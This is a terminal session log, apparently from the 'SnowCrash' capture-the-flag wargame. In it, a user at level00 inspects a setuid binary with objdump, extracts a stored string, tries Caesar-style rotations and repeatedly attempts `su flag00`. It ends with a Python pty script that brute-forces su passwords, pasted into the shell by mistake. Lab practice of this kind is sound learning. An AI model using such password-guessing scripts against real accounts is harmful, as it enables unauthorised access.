 37b0 00000000 00000000 00000000 00000000  ................
 37c0 00000000 00000000 00000000 00000000  ................
 37d0 00000000 00000000 00000000 00000000  ................
 37e0 00000000 00000000 00000000 00000000  ................
 37f0 00000000 00000000 00000000 00000000  ................
 3800 00000000 00000000 00000000 00000000  ................
 3810 00000000 00000000 00000000 00000000  ................
 3820 00000000 00000000 00000000 00000000  ................
 3830 00000000 00000000 00000000 00000000  ................
 3840 00000000 00000000 00000000 00000000  ................
 3850 00000000 00000000 00000000 00000000  ................
 3860 00000000 00000000 00000000 00000000  ................
 3870 00000000 00000000 00000000 00000000  ................
 3880 00000000 00000000 00000000 00000000  ................
 3890 00000000 00000000 00000000 00000000  ................
 38a0 00000000 00000000 00000000 00000000  ................
 38b0 00000000 00000000 00000000 00000000  ................
 38c0 00000000 00000000 00000000 00000000  ................
 38d0 00000000 00000000 00000000 00000000  ................
 38e0 00000000 00000000 00000000 00000000  ................
 38f0 00000000 00000000 00000000 00000000  ................
 3900 00000000 00000000 00000000 00000000  ................
 3910 00000000 00000000 00000000 00000000  ................
 3920 00000000 00000000 00000000 00000000  ................
 3930 00000000 00000000 00000000 00000000  ................
 3940 00000000 00000000 00000000 00000000  ................
 3950 00000000 00000000 00000000 00000000  ................
 3960 00000000 00000000 00000000 00000000  ................
 3970 00000000 00000000 00000000 00000000  ................
 3980 00000000 00000000 00000000 00000000  ................
 3990 00000000 00000000 00000000 00000000  ................
 39a0 00000000 00000000 00000000 00000000  ................
 39b0 00000000 00000000 00000000 00000000  ................
 39c0 00000000 00000000 00000000 00000000  ................
 39d0 00000000 00000000 00000000 00000000  ................
 39e0 00000000 00000000 00000000 00000000  ................
 39f0 00000000 00000000 00000000 00000000  ................
 3a00 00000000 00000000 00000000 00000000  ................
 3a10 00000000 00000000 00000000 00000000  ................
 3a20 00000000 00000000 00000000 00000000  ................
 3a30 00000000 00000000 00000000 00000000  ................
 3a40 00000000 00000000 00000000 00000000  ................
 3a50 00000000 00000000 00000000 00000000  ................
 3a60 00000000 00000000 00000000 00000000  ................
 3a70 00000000 00000000 00000000 00000000  ................
 3a80 00000000 00000000 00000000 00000000  ................
 3a90 00000000 00000000 00000000 00000000  ................
 3aa0 00000000 00000000 00000000 00000000  ................
 3ab0 00000000 00000000 00000000 00000000  ................
 3ac0 00000000 00000000 00000000 00000000  ................
 3ad0 00000000 00000000 00000000 00000000  ................
 3ae0 00000000 00000000 00000000 00000000  ................
 3af0 00000000 00000000 00000000 00000000  ................
 3b00 00000000 00000000 00000000 00000000  ................
 3b10 00000000 00000000 00000000 00000000  ................
 3b20 00000000 00000000 00000000 00000000  ................
 3b30 00000000 00000000 00000000 00000000  ................
 3b40 00000000 00000000 00000000 00000000  ................
 3b50 00000000 00000000 00000000 00000000  ................
 3b60 00000000 00000000 00000000 00000000  ................
 3b70 00000000 00000000 00000000 00000000  ................
 3b80 00000000 00000000 00000000 00000000  ................
 3b90 00000000 00000000 00000000 00000000  ................
 3ba0 00000000 00000000 00000000 00000000  ................
 3bb0 00000000 00000000 00000000 00000000  ................
 3bc0 00000000 00000000 00000000 00000000  ................
 3bd0 00000000 00000000 00000000 00000000  ................
 3be0 00000000 00000000 00000000 00000000  ................
 3bf0 00000000 00000000 00000000 00000000  ................
 3c00 00000000 00000000 00000000 00000000  ................
 3c10 00000000 00000000 00000000 00000000  ................
 3c20 00000000 00000000 00000000 00000000  ................
 3c30 00000000 00000000 00000000 00000000  ................
 3c40 00000000 00000000 00000000 00000000  ................
 3c50 00000000 00000000 00000000 00000000  ................
 3c60 00000000 00000000 00000000 00000000  ................
 3c70 00000000 00000000 00000000 00000000  ................
 3c80 00000000 00000000 00000000 00000000  ................
 3c90 00000000 00000000 00000000 00000000  ................
 3ca0 00000000 00000000 00000000 00000000  ................
 3cb0 00000000 00000000 00000000 00000000  ................
 3cc0 00000000 00000000 00000000 00000000  ................
 3cd0 00000000 00000000 00000000 00000000  ................
 3ce0 00000000 00000000 00000000 00000000  ................
 3cf0 00000000 00000000 00000000 00000000  ................
 3d00 00000000 00000000 00000000 00000000  ................
 3d10 00000000 00000000 00000000 00000000  ................
 3d20 00000000 00000000 00000000 00000000  ................
 3d30 00000000 00000000 00000000 00000000  ................
 3d40 00000000 00000000 00000000 00000000  ................
 3d50 00000000 00000000 00000000 00000000  ................
 3d60 00000000 00000000 00000000 00000000  ................
 3d70 00000000 00000000 00000000 00000000  ................
 3d80 00000000 00000000 00000000 00000000  ................
 3d90 00000000 00000000 00000000 00000000  ................
 3da0 00000000 00000000 00000000 00000000  ................
 3db0 00000000 00000000 00000000 00000000  ................
 3dc0 00000000 00000000 00000000 00000000  ................
 3dd0 00000000 00000000 00000000 00000000  ................
 3de0 00000000 00000000 00000000 00000000  ................
 3df0 00000000 00000000 00000000 00000000  ................
 3e00 00000000 00000000 00000000 00000000  ................
 3e10 00000000 00000000 00000000 00000000  ................
 3e20 00000000 00000000 00000000 00000000  ................
 3e30 00000000 00000000 00000000 00000000  ................
 3e40 00000000 00000000 00000000 00000000  ................
 3e50 00000000 00000000 00000000 00000000  ................
 3e60 00000000 00000000 00000000 00000000  ................
 3e70 00000000 00000000 00000000 00000000  ................
 3e80 00000000 00000000 00000000 00000000  ................
 3e90 00000000 00000000 00000000 00000000  ................
 3ea0 00000000 00000000 00000000 00000000  ................
 3eb0 00000000 00000000 00000000 00000000  ................
 3ec0 00000000 00000000 00000000 00000000  ................
 3ed0 00000000 00000000 00000000 00000000  ................
 3ee0 00000000 00000000 00000000 00000000  ................
 3ef0 00000000 00000000 00000000 00000000  ................
 3f00 00000000 00000000 00000000 00000000  ................
 3f10 00000000 00000000 00000000 00000000  ................
 3f20 00000000 00000000 00000000 00000000  ................
 3f30 00000000 00000000 00000000 00000000  ................
 3f40 00000000 00000000 00000000 00000000  ................
 3f50 00000000 00000000 00000000 00000000  ................
 3f60 00000000 00000000 00000000 00000000  ................
 3f70 00000000 00000000 00000000 00000000  ................
 3f80 00000000 00000000 00000000 00000000  ................
 3f90 00000000 00000000 00000000 00000000  ................
 3fa0 00000000 00000000 00000000 00000000  ................
 3fb0 00000000 00000000 00000000 00000000  ................
 3fc0 00000000 00000000 00000000 00000000  ................
 3fd0 00000000 00000000 00000000 00000000  ................
 3fe0 00000000 00000000 00000000 00000000  ................
 3ff0 00000000 00000000 00000000 00000000  ................
 4000 00000000 00000000 00000000 00000000  ................
 4010 00000000 00000000 00000000 00000000  ................
 4020 00000000 00000000 00000000 00000000  ................
 4030 00000000 00000000 00000000 00000000  ................
 4040 00000000 00000000 00000000 00000000  ................
 4050 00000000 00000000 00000000 00000000  ................
 4060 00000000 00000000 00000000 00000000  ................
 4070 00000000 00000000 00000000 00000000  ................
 4080 00000000 00000000 00000000 00000000  ................
 4090 00000000 00000000 00000000 00000000  ................
 40a0 00000000 00000000 00000000 00000000  ................
 40b0 00000000 00000000 00000000 00000000  ................
 40c0 00000000 00000000 00000000 00000000  ................
 40d0 00000000 00000000 00000000 00000000  ................
 40e0 72002536 335b5e3d 5d3d2531 32377300  r.%63[^=]=%127s.
 40f0 76657273 696f6e00 6d61785f 72657472  version.max_retr
 4100 69657300 73657373 696f6e5f 74696d65  ies.session_time
 4110 6f757400 72617465 5f6c696d 69740061  out.rate_limit.a
 4120 75646974 5f656e61 626c6564 006c6f67  udit_enabled.log
 4130 5f706174 68002f64 65762f70 74732f00  _path./dev/pts/.
 4140 2f646576 2f747479 00000000 00000000  /dev/tty........
 4150 4d455452 49435320 73657373 696f6e73  METRICS sessions
 4160 3d256c6c 75206465 6e69616c 733d256c  =%llu denials=%l
 4170 6c752074 696d656f 7574733d 256c6c75  lu timeouts=%llu
 4180 20636f6d 6d616e64 733d256c 6c752061   commands=%llu a
 4190 76675f73 6563733d 252e3266 0a00666c  vg_secs=%.2f..fl
 41a0 61673030 40736e6f 77637261 73683a7e  ag00@snowcrash:~
 41b0 2420005b 2a5d2043 6865636b 696e6720  $ .[*] Checking 
 41c0 63726564 656e7469 616c732e 2e2e0a00  credentials.....
 41d0 5b2a5d20 41636365 73732067 72616e74  [*] Access grant
 41e0 656420e2 80942077 656c636f 6d652c20  ed ... welcome, 
 41f0 666c6167 30300a00 0a536573 73696f6e  flag00...Session
 4200 2074696d 656f7574 2e0a000a 00696400   timeout.....id.
 4210 7569643d 33303030 28666c61 67303029  uid=3000(flag00)
 4220 20676964 3d333030 3028666c 61673030   gid=3000(flag00
 4230 29206772 6f757073 3d333030 3028666c  ) groups=3000(fl
 4240 61673030 29007768 6f616d69 00666c61  ag00).whoami.fla
 4250 67303000 686f7374 6e616d65 00536e6f  g00.hostname.Sno
 4260 77437261 73680075 6e616d65 202d6100  wCrash.uname -a.
 4270 756e616d 65000000 4c696e75 7820536e  uname...Linux Sn
 4280 6f774372 61736820 332e322e 302d342d  owCrash 3.2.0-4-
 4290 616d6436 34202331 20534d50 20446562  amd64 #1 SMP Deb
 42a0 69616e20 332e322e 35312d31 20783836  ian 3.2.51-1 x86
 42b0 5f363420 474e552f 4c696e75 78007077  _64 GNU/Linux.pw
 42c0 64002f68 6f6d652f 666c6167 30300065  d./home/flag00.e
 42d0 6e760053 48454c4c 3d2f6269 6e2f6261  nv.SHELL=/bin/ba
 42e0 73680048 4f4d453d 2f686f6d 652f666c  sh.HOME=/home/fl
 42f0 61673030 00555345 523d666c 61673030  ag00.USER=flag00
 4300 004c4f47 4e414d45 3d666c61 67303000  .LOGNAME=flag00.
 4310 50415448 3d2f7573 722f6c6f 63616c2f  PATH=/usr/local/
 4320 62696e3a 2f757372 2f62696e 3a2f6269  bin:/usr/bin:/bi
 4330 6e005445 524d3d78 7465726d 2d323536  n.TERM=xterm-256
 4340 636f6c6f 72006c73 00746f74 616c2031  color.ls.total 1
 4350 32000000 00000000 64727778 722d782d  2.......drwxr-x-
 4360 2d2d2032 20666c61 67303020 666c6167  -- 2 flag00 flag
 4370 30302034 30393620 4a616e20 20312030  00 4096 Jan  1 0
 4380 303a3030 202e0000 64727778 722d7872  0:00 ...drwxr-xr
 4390 2d782032 3220726f 6f742020 20726f6f  -x 22 root   roo
 43a0 74202020 34303936 204a616e 20203120  t   4096 Jan  1 
 43b0 30303a30 30202e2e 00000000 00000000  00:00 ..........
 43c0 2d722d2d 2d2d2d2d 2d2d2031 20666c61  -r-------- 1 fla
 43d0 67303020 666c6167 30302020 20333220  g00 flag00   32 
 43e0 4a616e20 20312030 303a3030 202e666c  Jan  1 00:00 .fl
 43f0 61670000 00000000 2d727773 722d782d  ag......-rwsr-x-
 4400 2d2d2031 20666c61 67303020 6c657665  -- 1 flag00 leve
 4410 6c303020 20313232 3838204a 616e2020  l00  12288 Jan  
 4420 31203030 3a303020 6869726f 00636174  1 00:00 hiro.cat
 4430 00636174 3a207065 726d6973 73696f6e  .cat: permission
 4440 2064656e 69656400 7375646f 00000000   denied.sudo....
 4450 7375646f 3a20736f 7272792c 20796f75  sudo: sorry, you
 4460 206d7573 74206861 76652061 20747479   must have a tty
 4470 20746f20 72756e20 7375646f 00737500   to run sudo.su.
 4480 73753a20 41757468 656e7469 63617469  su: Authenticati
 4490 6f6e2066 61696c75 72650065 78697400  on failure.exit.
 44a0 71756974 006c6f67 6f757400 68656c70  quit.logout.help
 44b0 00000000 00000000 474e5520 62617368  ........GNU bash
 44c0 2c207665 7273696f 6e20342e 322e3337  , version 4.2.37
 44d0 2831292d 72656c65 61736520 28783836  (1)-release (x86
 44e0 5f36342d 70632d6c 696e7578 2d676e75  _64-pc-linux-gnu
 44f0 29005479 70652027 68656c70 2720746f  ).Type 'help' to
 4500 20736565 20746869 73206c69 73742e00   see this list..
 4510 25733a20 636f6d6d 616e6420 6e6f7420  %s: command not 
 4520 666f756e 640a002f 6574632f 736e6f77  found../etc/snow
 4530 63726173 682f6869 726f2e63 6f6e6600  crash/hiro.conf.
 4540 6572726f 723a2070 6f6c6963 79207665  error: policy ve
 4550 7273696f 6e206d69 736d6174 63680064  rsion mismatch.d
 4560 656e6965 645f7569 645f7261 6e676500  enied_uid_range.
 4570 6572726f 723a2075 6964206e 6f742070  error: uid not p
 4580 65726d69 74746564 0064656e 6965645f  ermitted.denied_
 4590 75736572 6e616d65 5f696e76 616c6964  username_invalid
 45a0 00657272 6f723a20 696e7661 6c696420  .error: invalid 
 45b0 75736572 6e616d65 0064656e 6965645f  username.denied_
 45c0 72617465 5f6c696d 69740065 72726f72  rate_limit.error
 45d0 3a207261 7465206c 696d6974 20657863  : rate limit exc
 45e0 65656465 64006465 6e696564 5f67726f  eeded.denied_gro
 45f0 75700000 00000000 6572726f 723a2067  up......error: g
 4600 726f7570 206d656d 62657273 68697020  roup membership 
 4610 63686563 6b206661 696c6564 00736573  check failed.ses
 4620 73696f6e 5f737461 72740073 65737369  sion_start.sessi
 4630 6f6e5f65 6e640000 00000000 00003e40  on_end........>@
level00@snowcrash:~$ gdb -batch -ex 'x/20s 0x4200' /opt/snowcrash/level00/hiro 2>/dev/null || strings -a -t x /opt/snowcrash/level00/hiro | grep -E '120|121|124'
Please ask your administrator.
level00@snowcrash:~$ objdump -t /opt/snowcrash/level00/hiro | grep "flag_data"
0000000000004640 l     O .flag_data	000000000000001b              flag_data
level00@snowcrash:~$ cat /etc/snowcrash/hiro.conf
cat: /etc/snowcrash/hiro.conf: No such file or directory
level00@snowcrash:~$ cat /var/log/snowcrash/hiro.log 2>/dev/null
level00@snowcrash:~$ find / -user flag00 2>/dev/null
/home/flag00
/opt/snowcrash/level00/hiro
level00@snowcrash:~$ objdump -s -j .flag_data /opt/snowcrash/level00/hiro

/opt/snowcrash/level00/hiro:     file format elf64-x86-64

Contents of section .flag_data:
 4640 66326176 35696c30 32707561 6e6f376e  f2av5il02puano7n
 4650 61616636 61646166 336100             aaf6adaf3a.     
level00@snowcrash:~$ gdb -batch -ex 'x/s 0x4640' /opt/snowcrash/level00/hiro 2>/dev/null
Please ask your administrator.
level00@snowcrash:~$ python3 -c "print(open('/opt/snowcrash/level00/hiro', 'rb').read()[0x3640:0x365b])" 2>/dev/null || python -c "print(open('/opt/snowcrash/level00/hiro', 'rb').read()[0x3640:0x365b])"
b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
level00@snowcrash:~$ objdump -s -j .flag_data /opt/snowcrash/level00/hiro

/opt/snowcrash/level00/hiro:     file format elf64-x86-64

Contents of section .flag_data:
 4640 66326176 35696c30 32707561 6e6f376e  f2av5il02puano7n
 4650 61616636 61646166 336100             aaf6adaf3a.     
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ python3 -c '
string = "f2av5il02puano7naaf6adaf3a"
for shift in range(1, 26):
    decoded = ""
    for char in string:
        if char.isalpha():
            base = ord("a") if char.islower() else ord("A")
            decoded += chr((ord(char) - base + shift) % 26 + base)
        else:
            decoded += char
    print(f"Shift {shift:2d}: {decoded}")
'
Shift  1: g2bw5jm02qvbop7obbg6bebg3b
Shift  2: h2cx5kn02rwcpq7pcch6cfch3c
Shift  3: i2dy5lo02sxdqr7qddi6dgdi3d
Shift  4: j2ez5mp02tyers7reej6ehej3e
Shift  5: k2fa5nq02uzfst7sffk6fifk3f
Shift  6: l2gb5or02vagtu7tggl6gjgl3g
Shift  7: m2hc5ps02wbhuv7uhhm6hkhm3h
Shift  8: n2id5qt02xcivw7viin6ilin3i
Shift  9: o2je5ru02ydjwx7wjjo6jmjo3j
Shift 10: p2kf5sv02zekxy7xkkp6knkp3k
Shift 11: q2lg5tw02aflyz7yllq6lolq3l
Shift 12: r2mh5ux02bgmza7zmmr6mpmr3m
Shift 13: s2ni5vy02chnab7anns6nqns3n
Shift 14: t2oj5wz02diobc7boot6orot3o
Shift 15: u2pk5xa02ejpcd7cppu6pspu3p
Shift 16: v2ql5yb02fkqde7dqqv6qtqv3q
Shift 17: w2rm5zc02glref7errw6rurw3r
Shift 18: x2sn5ad02hmsfg7fssx6svsx3s
Shift 19: y2to5be02intgh7gtty6twty3t
Shift 20: z2up5cf02jouhi7huuz6uxuz3u
Shift 21: a2vq5dg02kpvij7ivva6vyva3v
Shift 22: b2wr5eh02lqwjk7jwwb6wzwb3w
Shift 23: c2xs5fi02mrxkl7kxxc6xaxc3x
Shift 24: d2yt5gj02nsylm7lyyd6ybyd3y
Shift 25: e2zu5hk02otzmn7mzze6zcze3z
level00@snowcrash:~$ for i in {1..25}; do
  echo "f2av5il02puano7naaf6adaf3a" | tr "$(printf '%b' $(printf '\\%03o' $((97 + i))))-za-$(printf '%b' $(printf '\\%03o' $((96 + i))))" "a-z"
done
e2zu5hk02otzmn7mzze6zcze3z
d2yt5gj02nsylm7lyyd6ybyd3y
c2xs5fi02mrxkl7kxxc6xaxc3x
b2wr5eh02lqwjk7jwwb6wzwb3w
a2vq5dg02kpvij7ivva6vyva3v
z2up5cf02jouhi7huuz6uxuz3u
y2to5be02intgh7gtty6twty3t
x2sn5ad02hmsfg7fssx6svsx3s
w2rm5zc02glref7errw6rurw3r
v2ql5yb02fkqde7dqqv6qtqv3q
u2pk5xa02ejpcd7cppu6pspu3p
t2oj5wz02diobc7boot6orot3o
s2ni5vy02chnab7anns6nqns3n
r2mh5ux02bgmza7zmmr6mpmr3m
q2lg5tw02aflyz7yllq6lolq3l
p2kf5sv02zekxy7xkkp6knkp3k
o2je5ru02ydjwx7wjjo6jmjo3j
n2id5qt02xcivw7viin6ilin3i
m2hc5ps02wbhuv7uhhm6hkhm3h
l2gb5or02vagtu7tggl6gjgl3g
k2fa5nq02uzfst7sffk6fifk3f
j2ez5mp02tyers7reej6ehej3e
i2dy5lo02sxdqr7qddi6dgdi3d
h2cx5kn02rwcpq7pcch6cfch3c
g2bw5jm02qvbop7obbg6bebg3b
level00@snowcrash:~$ su flag00                                                                                                                                                              
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ i2dy5lo02sxdqr7qddi6dgdi3d
i2dy5lo02sxdqr7qddi6dgdi3d: command not found
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ gdb -batch -ex 'disass main' /opt/snowcrash/level00/hiro 2>/dev/null
Please ask your administrator.
level00@snowcrash:~$ objdump -d /opt/snowcrash/level00/hiro | grep -A 40 "<main>:"
0000000000002ab3 <main>:
    2ab3:	f3 0f 1e fa          	endbr64
    2ab7:	55                   	push   %rbp
    2ab8:	48 89 e5             	mov    %rsp,%rbp
    2abb:	48 81 ec 00 10 00 00 	sub    $0x1000,%rsp
    2ac2:	48 83 0c 24 00       	orq    $0x0,(%rsp)
    2ac7:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
    2ace:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
    2ad5:	00 00 
    2ad7:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2adb:	31 c0                	xor    %eax,%eax
    2add:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
    2ae4:	48 89 c7             	mov    %rax,%rdi
    2ae7:	e8 d8 ed ff ff       	call   18c4 <load_default_policy>
    2aec:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
    2af3:	48 89 c6             	mov    %rax,%rsi
    2af6:	48 8d 05 2a 1a 00 00 	lea    0x1a2a(%rip),%rax        # 4527 <_IO_stdin_used+0x1527>
    2afd:	48 89 c7             	mov    %rax,%rdi
    2b00:	e8 5a ee ff ff       	call   195f <parse_policy_file>
    2b05:	48 8d 95 90 ef ff ff 	lea    -0x1070(%rbp),%rdx
    2b0c:	48 8d 85 d0 ee ff ff 	lea    -0x1130(%rbp),%rax
    2b13:	48 89 d6             	mov    %rdx,%rsi
    2b16:	48 89 c7             	mov    %rax,%rdi
    2b19:	e8 6a f7 ff ff       	call   2288 <init_context>
    2b1e:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
    2b25:	48 89 c7             	mov    %rax,%rdi
    2b28:	e8 74 ea ff ff       	call   15a1 <open_audit>
    2b2d:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
    2b34:	48 89 c7             	mov    %rax,%rdi
    2b37:	e8 45 f3 ff ff       	call   1e81 <check_policy_version>
    2b3c:	85 c0                	test   %eax,%eax
    2b3e:	79 0f                	jns    2b4f <main+0x9c>
    2b40:	48 8d 05 f9 19 00 00 	lea    0x19f9(%rip),%rax        # 4540 <_IO_stdin_used+0x1540>
    2b47:	48 89 c7             	mov    %rax,%rdi
    2b4a:	e8 be f8 ff ff       	call   240d <fatal>
    2b4f:	8b 85 d0 ee ff ff    	mov    -0x1130(%rbp),%eax
    2b55:	89 c7                	mov    %eax,%edi
    2b57:	e8 84 fe ff ff       	call   29e0 <validate_uid_range>
    2b5c:	85 c0                	test   %eax,%eax
    2b5e:	75 2d                	jne    2b8d <main+0xda>
    2b60:	e8 e4 f5 ff ff       	call   2149 <metrics_record_denial>
level00@snowcrash:~$ find / -user flag00 2>/dev/null
/home/flag00
/opt/snowcrash/level00/hiro
level00@snowcrash:~$ find / -uid 3000 2>/dev/null
level00@snowcrash:~$ ls -la /home/level00
ls -la /opt/snowcrash/level00
total 32
drwxr-x---  3 level00 level00 4096 Sep 25 23:03 .
drwxr-xr-x 37 root    root    4096 Jun  9 19:04 ..
-rw-------  1 level00 level00  352 Sep 25 23:03 .bash_history
-rw-r--r--  1 level00 level00  220 Mar 31  2024 .bash_logout
-rw-r--r--  1 level00 level00 3771 Mar 31  2024 .bashrc
drwx------  2 level00 level00 4096 Sep 26 00:24 .cache
-rw-r--r--  1 level00 level00  807 Mar 31  2024 .profile
-r--r--r--  1 level00 level00   66 Jun  9 19:03 README
total 36
drwxr-xr-x  2 root   root     4096 Jun  9 19:03 .
drwxr-xr-x 18 root   root     4096 Jun  9 19:04 ..
-r-sr-x---  1 flag00 level00 27112 Jun  9 19:03 hiro
level00@snowcrash:~$ find / -name "*password*" -o -name "*pass*" -o -name "*.txt" 2>/dev/null | grep -v "/usr" | grep -v "/lib" | grep -v "/proc"
/run/systemd/ask-password
/boot/grub/i386-pc/legacy_password_test.mod
/boot/grub/i386-pc/password_pbkdf2.mod
/boot/grub/i386-pc/password.mod
/boot/grub/gfxblacklist.txt
/sys/devices/system/cpu/vulnerabilities/spec_store_bypass
/var/cache/debconf/passwords.dat
/etc/security/opasswd
/etc/passwd
/etc/pam.d/chpasswd
/etc/pam.d/passwd
/etc/pam.d/common-password
/etc/apparmor.d/abstractions/smbpass
/etc/apparmor.d/1password
/etc/apparmor.d/MongoDB_Compass
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/passwd-
/opt/snowcrash/level03/CMakeLists.txt
level00@snowcrash:~$ python3 -c '
data = "f2av5il02puano7naaf6adaf3a"

print("--- Rotación ASCII (byte a byte) ---")
for shift in range(1, 256):
    res = "".join(chr((ord(c) + shift) % 256) for c in data)
    if res.isprintable() and res.isalnum():
        print(f"Shift {shift:3d}: {res}")

print("\n--- Rotación Alfanumérica (a-z0-9) ---")
alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
for shift in range(1, len(alpha)):
    res = ""
    for c in data:
        if c in alpha:
            res += alpha[(alpha.index(c) + shift) % len(alpha)]
        else:
            res += c
    print(f"Shift {shift:2d}: {res}")
'
--- Rotación ASCII (byte a byte) ---
Shift   1: g3bw6jm13qvbop8obbg7bebg4b
Shift   2: h4cx7kn24rwcpq9pcch8cfch5c

--- Rotación Alfanumérica (a-z0-9) ---
Shift  1: g3bw6jm13qvbop8obbg7bebg4b
Shift  2: h4cx7kn24rwcpq9pcch8cfch5c
Shift  3: i5dy8lo35sxdqraqddi9dgdi6d
Shift  4: j6ez9mp46tyersbreejaehej7e
Shift  5: k7f0anq57uzfstcsffkbfifk8f
Shift  6: l8g1bor68v0gtudtgglcgjgl9g
Shift  7: m9h2cps79w1huveuhhmdhkhmah
Shift  8: nai3dqt8ax2ivwfviineilinbi
Shift  9: obj4eru9by3jwxgwjjofjmjocj
Shift 10: pck5fsvacz4kxyhxkkpgknkpdk
Shift 11: qdl6gtwbd05lyziyllqhlolqel
Shift 12: rem7huxce16mz0jzmmrimpmrfm
Shift 13: sfn8ivydf27n01k0nnsjnqnsgn
Shift 14: tgo9jwzeg38o12l1ootkorotho
Shift 15: uhpakx0fh49p23m2ppulpspuip
Shift 16: viqbly1gi5aq34n3qqvmqtqvjq
Shift 17: wjrcmz2hj6br45o4rrwnrurwkr
Shift 18: xksdn03ik7cs56p5ssxosvsxls
Shift 19: ylteo14jl8dt67q6ttyptwtymt
Shift 20: zmufp25km9eu78r7uuzquxuznu
Shift 21: 0nvgq36lnafv89s8vv0rvyv0ov
Shift 22: 1owhr47mobgw9at9ww1swzw1pw
Shift 23: 2pxis58npchxabuaxx2tx0x2qx
Shift 24: 3qyjt69oqdiybcvbyy3uy1y3ry
Shift 25: 4rzku7aprejzcdwczz4vz2z4sz
Shift 26: 5s0lv8bqsfk0dexd005w0305t0
Shift 27: 6t1mw9crtgl1efye116x1416u1
Shift 28: 7u2nxadsuhm2fgzf227y2527v2
Shift 29: 8v3oybetvin3gh0g338z3638w3
Shift 30: 9w4pzcfuwjo4hi1h44904749x4
Shift 31: ax5q0dgvxkp5ij2i55a1585ay5
Shift 32: by6r1ehwylq6jk3j66b2696bz6
Shift 33: cz7s2fixzmr7kl4k77c37a7c07
Shift 34: d08t3gjy0ns8lm5l88d48b8d18
Shift 35: e19u4hkz1ot9mn6m99e59c9e29
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ import pty
import os
import time

# Lista de las 35 rotaciones obtenidas
passwords = [
    "g3bw6jm13qvbop8obbg7bebg4b", "h4cx7kn24rwcpq9pcch8cfch5c",
    "i5dy8lo35sxdqraqddi9dgdi6d", "j6ez9mp46tyersbreejaehej7e",
    "k7f0anq57uzfstcsffkbfifk8f", "l8g1bor68v0gtudtgglcgjgl9g",
    "m9h2cps79w1huveuhhmdhkhmah", "nai3dqt8ax2ivwfviineilinbi",
    "obj4eru9by3jwxgwjjofjmjocj", "pck5fsvacz4kxyhxkkpgknkpdk",
    "qdl6gtwbd05lyziyllqhlolqel", "rem7huxce16mz0jzmmrimpmrfm",
    "sfn8ivydf27n01k0nnsjnqnsgn", "tgo9jwzeg38o12l1ootkorotho",
    "uhpakx0fh49p23m2ppulpspuip", "viqbly1gi5aq34n3qqvmqtqvjq",
    "wjrcmz2hj6br45o4rrwnrurwkr", "xksdn03ik7cs56p5ssxosvsxls",
    "ylteo14jl8dt67q6ttyptwtymt", "zmufp25km9eu78r7uuzquxuznu",
    "0nvgq36lnafv89s8vv0rvyv0ov", "1owhr47mobgw9at9ww1swzw1pw",
    "2pxis58npchxabuaxx2tx0x2qx", "3qyjt69oqdiybcvbyy3uy1y3ry",
    "4rzku7aprejzcdwczz4vz2z4sz", "5s0lv8bqsfk0dexd005w0305t0",
    "6t1mw9crtgl1efye116x1416u1", "7u2nxadsuhm2fgzf227y2527v2",
    "8v3oybetvin3gh0g338z3638w3", "9w4pzcfuwjo4hi1h44904749x4",
    "ax5q0dgvxkp5ij2i55a1585ay5", "by6r1ehwylq6jk3j66b2696bz6",
    "cz7s2fixzmr7kl4k77c37a7c07", "d08t3gjy0ns8lm5l88d48b8d18",
    "e19u4hkz1ot9mn6m99e59c9e29"
]

for pwd in passwords:
    pid, fd = pty.fork()
    if pid == 0:
        os.execlp("su", "su", "flag00", "-c", "whoami")
    else:
        time.sleep(0.1)
        output = os.read(fd, 1024).decode(errors='ignore')
        if "Password:" in output or "Contraseña:" in output:
            os.write(fd, (pwd + "\n").encode())
            time.sleep(0.2)
            result = os.read(fd, 1024).decode(errors='ignore')
            if "Authentication failure" not in result and "Falló" not in result:
                print(f"[+] ¡CONTRASEÑA ENCONTRADA!: {pwd}")
                break
        os.close(fd)
        os.waitpid(pid, 0)
Command 'import' not found, but can be installed with:
apt install graphicsmagick-imagemagick-compat  # version 1.4+really1.3.42-1, or
